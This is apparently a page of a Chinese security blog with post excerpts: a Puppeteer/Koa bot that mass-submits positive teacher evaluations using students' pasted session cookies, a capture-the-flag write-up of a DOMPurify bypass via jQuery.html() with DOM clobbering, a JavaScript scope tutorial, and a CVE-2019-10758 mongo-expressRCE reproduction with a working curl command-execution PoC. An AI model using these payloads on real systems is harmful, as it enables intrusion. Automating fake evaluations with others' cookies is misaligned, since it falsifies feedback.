<p>如果你想对中间键进行分析的话，建议把断点打在这里，因为只是进入中间键的第一步，fn是一个回调的函数<br><img src="http://static.zybuluo.com/1160307775/iz3ez5c6rlrlllaipylotxfq/image_1dtsfb8ds4ebel43qt60o1rk99.png" alt="image_1dtsfb8ds4ebel43qt60o1rk99.png-366.2kB"></p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p>关于express中间键的加载以及路由的调度，<strong>强烈建议</strong>看这篇文章<a href="https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/" target="_blank" rel="noopener">express源码分析</a></p>
<h2 id="应用实例1-某信息工程大学全自动评教"><a href="#应用实例1-某信息工程大学全自动评教" class="headerlink" title="应用实例1-某信息工程大学全自动评教"></a>应用实例1-某信息工程大学全自动评教</h2><p>由于贵校老师实在太多了，闲来无事写了个自动评教(默认全好评)。之所以写了一个koa，是因为最初我想挂到机房，同学们拿着cookie在我web端傻瓜式自动评教了。后来我发现贵校的sso的session竟然验证了ip，代码放出来。</p>
<pre><code>const puppeteer = require(&#39;puppeteer&#39;);
const Koa = require(&#39;koa&#39;);
const router = require(&#39;koa-router&#39;);
const bodyParser = require(&#39;koa-bodyparser&#39;);

const app = new Koa()
const home  = new router()

async function autoFound(url,cookie){
        const browser = await puppeteer.launch({
            headless: false
        });
        const page = await browser.newPage();
        page.on(&#39;dialog&#39;,(dialog)=&gt;{
            console.log(dialog.message());
            dialog.accept(&quot;确定&quot;);
        });

        page.on(&#39;error&#39;,(err)=&gt;{
            console.log(err);
        });

        const cookies = [{
            name: &#39;semester.id&#39;,
            value: &#39;105&#39;,
            domain: &#39;210.41.225.2&#39;
            },{
            name: &#39;JSESSIONID&#39;,
            value: cookie,
            domain: &#39;210.41.225.2&#39;
            },{
            name: &#39;GSESSIONID&#39;,
            value: cookie,
            domain: &#39;210.41.225.2&#39;
            }];

        await page.setCookie(...cookies);

        await page.goto(url);
        const result = await page.evaluate(() =&gt; {
            var list = [...document.querySelectorAll(&#39;td &gt; a&#39;)]
            return list.map(el =&gt; {
                return {
                url: el.href.trim(),
                name: el.innerText
                }
            })
        })

        var answers = [&#39;老师真好，我很喜欢跟他相处&#39;,&#39;老师工作认真负责，课后问题及时讲解&#39;,&#39;在老师的课堂上学到很多知识&#39;];

        for(var i=0, len=result.length;i&lt;len;i++){
            let bufurl = result[i][&quot;url&quot;];
            try{
                await page.goto(bufurl);
                await page.waitForSelector(&#39;.option-item&#39;);
                await page.click(&quot;input[id=option_425_0]&quot;);
                await page.click(&quot;input[id=option_426_0]&quot;);
                await page.click(&quot;input[id=option_427_0]&quot;);
                await page.click(&quot;input[id=option_428_0]&quot;);
                await page.click(&quot;input[id=option_429_0]&quot;);
                await page.click(&quot;input[id=option_430_0]&quot;);
                await page.click(&quot;input[id=option_431_0]&quot;);
                await page.click(&quot;input[id=option_432_0]&quot;);
                await page.click(&quot;input[id=option_433_0]&quot;);
                await page.click(&quot;input[id=option_434_0]&quot;);
                await page.click(&quot;input[id=option_435_0]&quot;);
                await page.click(&quot;input[id=option_436_0]&quot;);
                await page.click(&quot;input[id=option_437_4]&quot;);
                await page.click(&quot;input[id=option_438_3]&quot;);
                await page.click(&quot;input[id=option_439_0]&quot;);
                await page.click(&quot;input[id=option_440_0]&quot;);
                await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });
                await page.click(&#39;#sub&#39;);
                await page.waitFor(3000);
                console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);
            }catch(err){
                try{
                    await page.goto(bufurl);
                    await page.waitForSelector(&#39;.option-item&#39;);
                    await page.click(&quot;input[id=option_382_0]&quot;);
                    await page.click(&quot;input[id=option_383_0]&quot;);
                    await page.click(&quot;input[id=option_384_0]&quot;);
                    await page.click(&quot;input[id=option_385_0]&quot;);
                    await page.click(&quot;input[id=option_386_0]&quot;);
                    await page.click(&quot;input[id=option_387_0]&quot;);
                    await page.click(&quot;input[id=option_388_0]&quot;);
                    await page.click(&quot;input[id=option_389_0]&quot;);
                    await page.click(&quot;input[id=option_390_0]&quot;);
                    await page.click(&quot;input[id=option_391_0]&quot;);
                    await page.click(&quot;input[id=option_392_0]&quot;);
                    await page.click(&quot;input[id=option_393_0]&quot;);
                    await page.click(&quot;input[id=option_502_4]&quot;);
                    await page.click(&quot;input[id=option_395_3]&quot;);
                    await page.click(&quot;input[id=option_396_0]&quot;);
                    await page.click(&quot;input[id=option_397_0]&quot;);
                    await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });
                    await page.click(&#39;#sub&#39;);
                    await page.waitFor(3000);
                    console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);
                }catch(err){
                    await page.goto(bufurl);
                    await page.waitForSelector(&#39;.option-item&#39;);
                    await page.click(&quot;input[id=option_414_0]&quot;);
                    await page.click(&quot;input[id=option_415_0]&quot;);
                    await page.click(&quot;input[id=option_416_0]&quot;);
                    await page.click(&quot;input[id=option_417_0]&quot;);
                    await page.click(&quot;input[id=option_418_0]&quot;);
                    await page.click(&quot;input[id=option_419_0]&quot;);
                    await page.click(&quot;input[id=option_420_0]&quot;);
                    await page.click(&quot;input[id=option_421_0]&quot;);
                    await page.click(&quot;input[id=option_422_0]&quot;);
                    await page.click(&quot;input[id=option_423_0]&quot;);
                    await page.click(&quot;input[id=option_424_0]&quot;);
                    await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });
                    await page.click(&#39;#sub&#39;);
                    await page.waitFor(3000);
                    console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);
                }
            }
        }
        await browser.close();
}

home.get(&#39;/&#39;,async(ctx)=&gt;{
    let html = `
    &lt;html&gt;
    &lt;body&gt;
    &lt;p&gt;
        首先登陆jwc.cuit.edu.cn，&quot;量化评教&quot;的学情自己填了(否则不允许评教)
    &lt;/p&gt;
    &lt;p&gt;
        然后浏览器f12控制台输入document.cookie，例如:
    &lt;/p&gt;

    &lt;p&gt;
        GSESSIONID=B8209EC9AF980BDFE89CF0C43C356DC8
    &lt;/p&gt;

    &lt;p&gt; 
        则把B8209EC9AF980BDFE89CF0C43C356DC8复制到框内提交
    &lt;/p&gt;
    &lt;form action=&quot;evaluate&quot; method=&quot;post&quot;&gt;
        &lt;input type=&quot;text&quot; id=&quot;cookie&quot; name=&quot;Mycookie&quot;&gt;
        &lt;input type=&quot;submit&quot; id=&quot;btn_click&quot; name=&quot;submit&quot;/&gt;
    &lt;/form&gt;
    &lt;/body&gt;

    &lt;/html&gt;`
    ctx.body = html

})

home.post(&#39;/evaluate&#39;,async(ctx)=&gt;{
    cookie = ctx.request.body.Mycookie;
    ctx.body = &quot;[+]waiting..后台正在帮您自动评教..请一分钟以后刷新jwc查看情况...&quot;;
    console.log(cookie);
    autoFound(&#39;http://210.41.225.2/eams/quality/stdEvaluate.action&#39;,cookie);
})

app.use(bodyParser())
app.use(home.routes()).use(home.allowedMethods());
app.listen(3000)
console.log(&#39;[demo] start-quick is starting at port 3000&#39;)</code></pre><p>如果想改变对老师的印象可自行更改以下内容</p>
<pre><code>[&#39;老师真好，我很喜欢跟他相处&#39;,&#39;老师工作认真负责，课后问题及时讲解&#39;,&#39;在老师的课堂上学到很多知识&#39;]</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2025/01/03/Node的一些应用技巧(持续更新)/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2020/02/01/一道有趣的XSS-Challenge/"> 
                    一道有趣的XSS-Challenge 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-02-01   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全/">前端安全</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="一道有趣的XSS-Challenge"><a href="#一道有趣的XSS-Challenge" class="headerlink" title="一道有趣的XSS-Challenge"></a>一道有趣的XSS-Challenge</h1><p>早上刷某特时推送了三上悠ya的动态，猛点双击后却发现是pwnfunction更新了一道xss-challenge的wp(上当了上当了)。看了下题目难度是hard，质量很高，考点也很有趣。官方wp的payload和解题思路看起来不是很复杂，实际上还是隐藏了很多知识点，如果大家复现这个题目，希望这篇文章能够对你有帮助。</p>
<h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>题目名称:WW<br>题目难度:Hard<br>题目地址:<a href="https://xss.pwnfunction.com/challenges/ww3/" target="_blank" rel="noopener">https://xss.pwnfunction.com/challenges/ww3/</a><br>思路:bypass DOMPurify+DOM clobbering</p>
<p>可控的输入的点有两个<code>text</code>，<code>img</code></p>
<pre><code>let text = new URL(location).searchParams.get(&#39;text&#39;)
let img = new URL(location).searchParams.get(&#39;img&#39;)</code></pre><p><code>img</code>作为img标签的src属性被写入，且被过滤了关键符号。</p>
<pre><code>&lt;img class=&quot;circle&quot; src=&quot;${escape(img)}&quot; onload=&quot;memeGen(this, notify)&quot;&gt;

const escape = (dirty) =&gt; unescape(dirty).replace(/[&lt;&gt;&#39;&quot;=]/g, &#39;&#39;);</code></pre><p><code>text</code>作为文本被渲染，渲染前都经过一次DOMPurify.sanitize处理</p>
<pre><code>//part1
document.write(
...
Creating meme... (${DOMPurify.sanitize(text)})
)

//part2 
html = (`&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;&lt;b&gt;Meme&lt;/b&gt; created from ${DOMPurify.sanitize(text)}&lt;/div&gt;`)

notify ? ($(&#39;#notify&#39;).html(html)) : &#39;&#39;</code></pre><h2 id="DOMpurify-bypass-via-Jquery-html"><a href="#DOMpurify-bypass-via-Jquery-html" class="headerlink" title="DOMpurify bypass via Jquery.html()"></a>DOMpurify bypass via Jquery.html()</h2><p>乍一看经过<code>DOMPurify</code>后的这些交互点都很安全，但是使用<code>html()</code>解析会存在标签逃逸问题。</p>
<p>题目作者在wp中提到了两种解析html的方式:<strong>jquery.html&amp;innerhtml</strong>。<code>innerHTML</code>是原生js的写法，<code>Jqury.html()</code>也是调用原生的innerHTML方法，但是加了自己的解析规则(后文介绍)。</p>
<p>关于两种方式:<code>Jquery.html()</code>和<code>innerHTMl</code>的区别我们用示例来看。</p>
<p>对于innerHTML：模拟浏览器自动补全标签，不处理非法标签。同时，<code>&lt;style&gt;</code>标签中不允许存在子标签(style标签最初的设计理念就不能用来放子标签)，如果存在会被当作text解析。因此<code>&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert(1337)//</code>会被渲染如下</p>
<pre><code>&lt;style&gt;
    &lt;style/&gt;&lt;script&gt;alert(1337)//
&lt;/style&gt;</code></pre><p>对于<code>Jqury.html()</code>，最终对标签的处理是在<code>htmlPrefilter()</code>中实现:<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js" target="_blank" rel="noopener">jquery-src</a>，其后再进行原生innerHTML的调用来加载到页面。</p>
<pre><code>rxhtmlTag = /&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0&gt;\x20\t\r\n\f]*)[^&gt;]*)\/&gt;/gi
/&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0&gt;\x20\t\r\n\f]*)[^&gt;]*)\/&gt;/gi


jQuery.extend( {
    htmlPrefilter: function( html ) {
        return html.replace( rxhtmlTag, &quot;&lt;$1&gt;&lt;/$2&gt;&quot; );
    }
    ...
})

tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];</code></pre><p>有意思的是，这个正则表达式在匹配<code>&lt;*/&gt;</code>之后会重新生成一对标签(区别于直接调用innerHTML)<br><img src="http://static.zybuluo.com/1160307775/se8cdbp2typ6p6dd55uhmjn5/image_1dv0k1frc1f1p1l9j210u38bnc1g.png" alt="image_1dv0k1frc1f1p1l9j210u38bnc1g.png-45.1kB"></p>
<p>所以相同的语句<code>&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert(1337)//</code>则会被解析成如下形式，成功逃逸<code>&lt;script&gt;</code>标签。</p>
<pre><code>&lt;style&gt;
    &lt;style&gt;
&lt;/style&gt;
&lt;script&gt;alert(1337)//</code></pre><p><img src="http://static.zybuluo.com/1160307775/d4hgs4rdmhqrcjx6y63dkol9/image_1dv0ko5kbv8h1gkkv3d1g6b1gf21t.png" alt="image_1dv0ko5kbv8h1gkkv3d1g6b1gf21t.png-51.8kB"></p>
<p>我们知道DOMPurify的工作机制是将传入的payload分配给元素的innerHtml属性，让浏览器解释它(但不执行)，然后对潜在的XSS进行清理。由于DOMPurify在对其进行<code>innerHtml</code>处理时，<code>script</code>标签被当作<code>style</code>标签的text处理了，所以DOMPurify不会进行清洗(因为认为这是无害的payload)，但在其后进入html()时，这个无害payload就能逃逸出来一个有害的<code>script</code>标签从而xss。</p>
<h2 id="DOM-clobbering"><a href="#DOM-clobbering" class="headerlink" title="DOM-clobbering"></a>DOM-clobbering</h2><p>第二个考点是要覆盖变量<code>notify</code>，只有在notify不为false的时候才能顺利进入html()方法</p>
<pre><code class="javascript">let notify = false;

document.write(`&lt;img class=&quot;circle&quot; src=&quot;${escape(img)}&quot; onload=&quot;memeGen(this, notify)&quot;&gt;`)

const memeGen = (that, notify) =&gt; {
        if (notify) {
                html = (`${DOMPurify.sanitize(text)}`)
            }
        ...
        $(&#39;#notify&#39;).html(html)
}</code></pre>
<p>首先尝试用DOM-clobbering创造一个id为<code>notify</code>的变量，但是这种方式不允许覆盖已经存在的变量。</p>
<pre><code>&lt;html&gt;
&lt;img id=notify&gt;
&lt;img src=&quot;&quot; onerror=&quot;memeGen(notify)&quot;&gt;

&lt;script&gt;
const memeGen = (notify) =&gt;{
    consol.log(notify);  //false
}

let notify = false;
&lt;/script&gt;
&lt;/html&gt;</code></pre><p>不过我们依然可以借助标签的name属性值，为document对象创造一个变量<code>document.notify</code>，熟悉dom-clobbing的都很了解这种方式也常用来覆盖<code>document</code>的各种属性/方法。然而这道题不需要覆盖什么，我们就先把它当作一种创造变量的手段，后文再讲。我们先看简单了解一下JS的作用域</p>
<h2 id="JS作用域-amp-作用域链"><a href="#JS作用域-amp-作用域链" class="headerlink" title="JS作用域&amp;作用域链"></a>JS作用域&amp;作用域链</h2><p>在JS的函数中，一个变量是否可访问要看它的作用域(scope)，变量的作用域有全局作用域和局部作用域(函数作用域)两种，关于详细的介绍可以移步之前博客的小记：<a href="https://hpdoger.cn/2020/01/20/%E6%B7%B1%E5%85%A5Javascript-%E4%BD%9C%E7%94%A8%E5%9F%9F&Scope%20Chain/">深入Javascript-作用域&amp;Scope Chain</a>，这里举个最简单的例子如下</p>
<pre><code>function init() {
    var inVariable = &quot;local&quot;;
}
init();
console.log(inVariable); //Uncaught ReferenceError: inVariable is not defined</code></pre><p>这就是因为函数内部用<code>var</code>声明的<code>inVariaiable</code>属于局部作用域范畴，在全局作用域没有声明。我们可以这样理解：作用域就是一个独立的地盘，让变量不会外泄、暴露出去。也就是说作用域最大的用处就是隔离变量，不同作用域下同名变量不会有冲突</p>
<p>在寻找一个变量可访问性时根据作用域链来查找的，作用域链中的下一个变量对象来自包含（外部）环境，而再下一个变量对象则来自下一个包含环境。这样，一直延续到全局执行环境；全局执行环境的变量对象始终都是作用域链中的最后一个对象。</p>
<p>而在Javascript event handler(时间处理程序)中，也就是onxx事件中(这块地盘)，scope chain的调用就比较有意思了。它会先去判断当前的scope是否有局部变量<code>notify</code>，若不存在向上查找<code>window.document.notify</code>，仍不存在继续向上到全局执行环境即<code>window.notify</code>为止。</p>
<p>这样说起来可能有点绕，我们来看下面这个例子就明白了</p>
<pre><code class="javascript">&lt;img src=&quot;&quot; onerror=&quot;console.log(nickname)&quot;&gt; //pig
&lt;img src=&quot;&quot; onerror=&quot;var nickname=&#39;dog&#39;;console.log(nickname)&quot;&gt; //dog

&lt;script&gt;
window.document.nickname = &#39;pig&#39;;
window.nickname = &#39;cat&#39;;
&lt;script&gt;</code></pre>
<p>打印的结果分别为<code>pig</code>和<code>dog</code>。原因就是在第二个img标签中，onerror的上下文存在局部作用域的nickname变量，不用再向上查找了。</p>
<p>同时注意到题目触发<code>memeGen</code>函数的方式也恰好是写在event handler中–即<code>onload</code>内。所以污染了<code>document.notify</code>就相当于污染了将要传递的实参<code>notify</code>，这也就是为什么需要之前的dom-clobbing。</p>
<pre><code>&lt;img class=&quot;circle&quot; src=url onload=&quot;memeGen(this, notify)&quot;&gt;</code></pre><h2 id="思路线-amp-题外话"><a href="#思路线-amp-题外话" class="headerlink" title="思路线&amp;题外话"></a>思路线&amp;题外话</h2><p><strong>dom clobbing新建一个document.notify-&gt;onload-&gt;bypass D0MPurify via html()=&gt;XSS</strong></p>
<p>另外，我们前文提到在event handler的作用域中scope chain是:局部变量-&gt;document-&gt;global。</p>
<p>但是在普通的局部作用域内，scope chain <strong>没有</strong> document这一链，而是<code>局部作用域变量-&gt;global</code>，示例如下</p>
<pre><code class="javascript">&lt;script&gt;
window.document.nickname = &#39;pig&#39;;
window.nickname = &#39;cat&#39;;
let nickname = &#39;dog&#39;;

function echoNameA(nickname){
    console.log(nickname); // dog
}

window.realname = &#39;me&#39;;
window.document.realname = &#39;hpdoger&#39;;

function echoNameB(){
    console.log(realname); //me
}

echoNameA(nickname);
echoNameB(realname);
&lt;/script&gt;</code></pre>

                
            </div>
            <div class="continue">
            <a href="/2020/02/01/一道有趣的XSS-Challenge/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2020/01/20/深入Javascript-作用域&Scope Chain/"> 
                    深入Javascript-作用域&amp;Scope Chain 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-01-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全/">前端安全</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="深入Javascript-作用域-amp-Scope-Chain"><a href="#深入Javascript-作用域-amp-Scope-Chain" class="headerlink" title="深入Javascript-作用域&amp;Scope Chain"></a>深入Javascript-作用域&amp;Scope Chain</h1><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>前一段时间朋友面试keen问了个问题：JS作用域是什么？正好这两天有一道XSS-Challenge也涉及了作用域的trick，填补了很多知识空白(JS的世界真是太特喵的nb了)，写一篇文章来扫个盲</p>
<h1 id="什么是JavaScript的作用域"><a href="#什么是JavaScript的作用域" class="headerlink" title="什么是JavaScript的作用域"></a>什么是JavaScript的作用域</h1><p>在JS中，一个函数内是否可访问某个变量，要看该变量的作用域(scope)。我们可以这样理解：<strong>作用域就是一个独立的地盘，让变量不会外泄、暴露出去。也就是说作用域最大的用处就是隔离变量，不同作用域下同名变量不会有冲突</strong></p>
<p>变量的作用域有全局作用域和局部作用域(函数作用域)两种</p>
<h2 id="全局作用域-Global-Scope"><a href="#全局作用域-Global-Scope" class="headerlink" title="全局作用域(Global Scope)"></a>全局作用域(Global Scope)</h2><p>在代码中任何地方都能访问到的<strong>对象</strong>拥有全局作用域，一般来说以下三种情形拥有全局作用域</p>
<h3 id="1-程序最外层定义的函数或者变量"><a href="#1-程序最外层定义的函数或者变量" class="headerlink" title="1-程序最外层定义的函数或者变量"></a>1-程序最外层定义的函数或者变量</h3><p>举个最简单的例子如下，<code>global</code>变量就属于全局作用域，不管是在 checkscope() 函数内部还是外部，都能访问到全局变量 global，<code>checkscope</code>函数也属于全局作用域。</p>
<pre><code>var global = &quot;global&quot;;     // 显式声明一个全局变量
function checkscope() {
    var local = &quot;local&quot;;   // 显式声明一个局部变量
    return global;         // 返回全局变量的值
}
console.log(scope);        // &quot;global&quot;
console.log(checkscope()); // &quot;global&quot;
console.log(local);        // error: local is not defined.</code></pre><h3 id="2-所有末定义直接赋值的变量"><a href="#2-所有末定义直接赋值的变量" class="headerlink" title="2-所有末定义直接赋值的变量"></a>2-所有末定义直接赋值的变量</h3><p>这个跟我们平常写代码的坏习惯有关，不加限制类型的变量会自动升级为全局作用域，这个就不限制在程序的最外层还是函数内部，示例如下：</p>
<pre><code class="javascript">username = &#39;hpdoger&#39;;

function echoName(){
    nickname = &#39;wuyanzu&#39;;
}

function CheckVal(){
    console.log(username); //hpdoger    
    console.log(nickname); //wuyanzu
}

echoName();
CheckVal();</code></pre>
<h3 id="3-Window对象的属性和方法"><a href="#3-Window对象的属性和方法" class="headerlink" title="3-Window对象的属性和方法"></a>3-Window对象的属性和方法</h3><p>一般情况下，window对象的内置属性都拥有全局作用域，例如window.name、window.location、window.top等等</p>
<p>通常在Javascript中我们说全局对象，指的就是Window对象，引用<code>this</code>指代的也是Window对象，如果我们在程序中定义一个全局作用域的变量，那么它自然也会成为Window对象的属性，所以下面的用法是等价的</p>
<pre><code>var name = &#39;hpdoger&#39;;

name == window.name; //true</code></pre><h2 id="局部作用域-Local-Scope"><a href="#局部作用域-Local-Scope" class="headerlink" title="局部作用域(Local Scope)"></a>局部作用域(Local Scope)</h2><p>和全局作用域相反，局部作用域一般只在固定的代码片段内可访问到。最常见的是在函数体内定义的变量，只能在函数体内使用</p>
<p>举个最简单的例子如下</p>
<pre><code>function init() {
    var inVariable = &quot;local&quot;;
}
init();
console.log(inVariable); //Uncaught ReferenceError: inVariable is not defined</code></pre><p><code>var</code>声明的<code>inVariaiable</code>属于局部作用域范畴，在全局作用域没有声明，只能在函数内部调用。这时候你可能有个疑问，它是<code>var</code>的声明啊，他喵的不应该是全局变量吗？？</p>
<p>实际上这跟它的声明方式没有一点关系。变量是否可引用，只由它的作用域决定。</p>
<h2 id="局部作用域与全局作用域的制约"><a href="#局部作用域与全局作用域的制约" class="headerlink" title="局部作用域与全局作用域的制约"></a>局部作用域与全局作用域的制约</h2><p>在函数体内，局部变量的优先级高于同名的全局变量。如果在函数内声明的一个局部变量或者函数参数中带有的变量和全局变量重名，那么全局变量就被局部变量所<strong>遮盖</strong>，而全局变量并不会因此发生值的变化，举个例子来看。</p>
<pre><code>var username = &#39;hpdoger&#39;;

function echoNameA(username){
    console.log(username);//wuyanzu
}

function echoNameB(){
    var username = &#39;wuyanzu&#39;;
    console.log(username); //wuyanzu
}

echoNameA(&#39;wuyanzu&#39;);
echoNameB();
console.log(username);   //hpdoger</code></pre><p>我们在这里用到<strong>遮盖</strong>这个词，其实是不准确的。因为读取变量值的方式是查找作用域链，也就是遍历Scope Chain，只是实现效果类似于遮盖。下文我们来看一下什么是Javascript的作用域链</p>
<h1 id="什么是Javascript作用域链"><a href="#什么是Javascript作用域链" class="headerlink" title="什么是Javascript作用域链"></a>什么是Javascript作用域链</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>在寻找一个变量可访问性(取值)时是根据作用域链来查找的，<strong>作用域链的用途，是保证对执行环境有权访问的所有变量和函数的有序访问</strong></p>
<p>我们先引入两个概念来走通scope chain</p>
<ul>
<li>AO：Activetion Object（活动对象）</li>
<li>VO：Variable Object（变量对象）</li>
</ul>
<p>AO对应的是函数执行阶段，当函数被调用执行时，会建立一个执行上下文，该执行上下文包含了函数所需的所有变量，该变量共同组成了一个新的对象就是Activetion Object。该对象包含了：</p>
<ul>
<li>函数的所有局部变量</li>
<li>函数的所有命名参数</li>
<li>函数的参数集合</li>
<li>函数的this指向</li>
</ul>
<p>举个例子来看函数执行的时候AO的值</p>
<pre><code>function add(a,b){
    var sum = a + b;
    function say(){
        alert(sum);
    }
    return sum;
}

add(4,5);</code></pre><p>如果我们用JS的对象来描述AO，那么它的表现形式如下</p>
<pre><code>  AO = {
        this : window,
        arguments : [4,5],
        a : 4,
        b : 5,
        say : ,
        sum : undefined
  }</code></pre><p>VO对应的是函数创建阶段，JS解析引擎进行预解析时，所有的变量和函数的声明，统称为Variable Object。该变量与执行上下文相关，知道自己的数据存储在哪里，并且知道如何访问。它分为全局上下文VO（全局对象，Global object，我们通常说的global对象）和函数上下文的AO，它存储着在上下文中声明的以下内容：</p>
<ul>
<li>变量 (var, 变量声明);</li>
<li>函数声明 (FunctionDeclaration, 缩写为FD);</li>
<li>函数的形参</li>
</ul>
<pre><code>function add(a,b){
    var sum = a + b;
    function say(){
        alert(sum);
    }
    return sum;
}
// sum,say,a,b 组合的对象就是VO，不过该对象的值基本上都是undefined</code></pre><h2 id="遍历作用域链"><a href="#遍历作用域链" class="headerlink" title="遍历作用域链"></a>遍历作用域链</h2><p>作用域链中的下一个变量对象来自包含（外部）环境，而再下一个变量对象则来自下一个包含环境。这样，一直延续到全局执行环境；全局执行环境的变量对象始终都是作用域链中的最后一个对象。</p>
<p>他喵的，上面好多都是我复制过来的，概念很复杂其实挺简单的，我们举一个简单的例子来看。</p>
<pre><code>var x = 10;

function foo() {
    var y = 20;

    function bar() {
        var z = 30;

        console.log(x + y + z); //60
    };

    bar()
};

foo();</code></pre><p>函数bar可以直接访问”z”，然后通过作用域链访问上层的”x”和”y”。此时的作用域链为：</p>
<pre><code>此时作用域链（Scope Chain）有三级，第一级为bar AO，第二级为foo AO,然后Global Object（VO）

    scope -&gt; bar.AO -&gt; foo.AO -&gt; Global Object

    bar.AO = {
        z : 30,
        __parent__ : foo.AO
    }

    foo.AO = {
        y : 20,
        bar : ,
        __parent__ : 
    }

    Global Object = {
        x : 10,
        foo : ,
        __parent__ : null
    }</code></pre><p>很简单，就是先从当前的AO一步一步向上遍历AO对象查找，走后查到VO(存储全局对象的东西)</p>
<h2 id="一个有趣的Scope-Chain"><a href="#一个有趣的Scope-Chain" class="headerlink" title="一个有趣的Scope Chain"></a>一个有趣的Scope Chain</h2><p>我们看下面的例子，console.log的打印值为<code>undefined</code></p>
<pre><code>var username = &#39;hpdoger&#39;;

function echoName(){
    console.log(username);  //undefiend
    var username = &#39;wuyanzu&#39;;
}

echoName();</code></pre><p>为啥不是hpdoger呢？这是因为AO建立的逻辑是要先声明变量，所以在函数<code>eechoName</code>中代码实际的执行流程是这样的：</p>
<pre><code>function echoName(){
    var username;
    console.log(username);
    var username = &#39;wuyanzu&#39;;
}</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2020/01/20/深入Javascript-作用域&Scope Chain/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2020/01/03/CVE-2019-10758-mongo-expressRCE复现分析/"> 
                    CVE-2019-10758:mongo-expressRCE复现分析 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-01-03   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="CVE-2019-10758-mongo-expressRCE复现分析"><a href="#CVE-2019-10758-mongo-expressRCE复现分析" class="headerlink" title="CVE-2019-10758:mongo-expressRCE复现分析"></a>CVE-2019-10758:mongo-expressRCE复现分析</h1><p>早上室友说发了一则mongo-express的预警，正好看到陈师傅也发了twitter，动手分析一下，如有差错还望指正</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>漏洞环境:<br><a href="https://github.com/mongo-express/mongo-express#readme" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express#readme</a><br><a href="https://github.com/masahiro331/CVE-2019-10758" target="_blank" rel="noopener">https://github.com/masahiro331/CVE-2019-10758</a></p>
<p>自己从官方拉到本地+mongodb的服务端或者docker起一个未授权的mongo端都可以，poc直接就能打出来</p>
<pre><code>curl &#39;http://localhost:8081/checkValid&#39; -H &#39;Authorization: Basic YWRtaW46cGFzcw==&#39;  --data &#39;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&#39;</code></pre><p><img src="http://static.zybuluo.com/1160307775/1ofxgk12w4566n8105f5s2x9/image_1dto0qppb1f1v124r13mi1rugm8o5q.png" alt="image_1dto0qppb1f1v124r13mi1rugm8o5q.png-386.7kB"></p>
<h1 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h1><p>文件<code>express-mongo/node_modules/mongo-express/lib/router.js</code>进行路由事件的方法绑定<br><img src="http://static.zybuluo.com/1160307775/77jhyl9xv7egdf09x00dvdiy/image_1dtnda3rm1r7412s61m5v1i71m5t3p.png" alt="image_1dtnda3rm1r7412s61m5v1i71m5t3p.png-617.2kB"></p>
<p>路由事件checkvalid对应的方法在文件<code>express-mongo/node_modules/mongo-express/lib/routes/document.js</code>，调用了<code>toBSON</code></p>
<p><img src="http://static.zybuluo.com/1160307775/fyz0jsczrxbneolxwpif75fk/image_1dtndcghv1ltvs581mfp1nfr11hu46.png" alt="image_1dtndcghv1ltvs581mfp1nfr11hu46.png-64.8kB"></p>
<p>在toBSON函数中将传入的参数放进vm2沙箱里去eval</p>
<pre><code>exports.toBSON = function (string) {
  var sandbox = exports.getSandbox();

  string = string.replace(/ISODate\(/g, &#39;new ISODate(&#39;);
  string = string.replace(/Binary\((&quot;[^&quot;]+&quot;),/g, &#39;Binary(new Buffer($1, &quot;base64&quot;),&#39;);

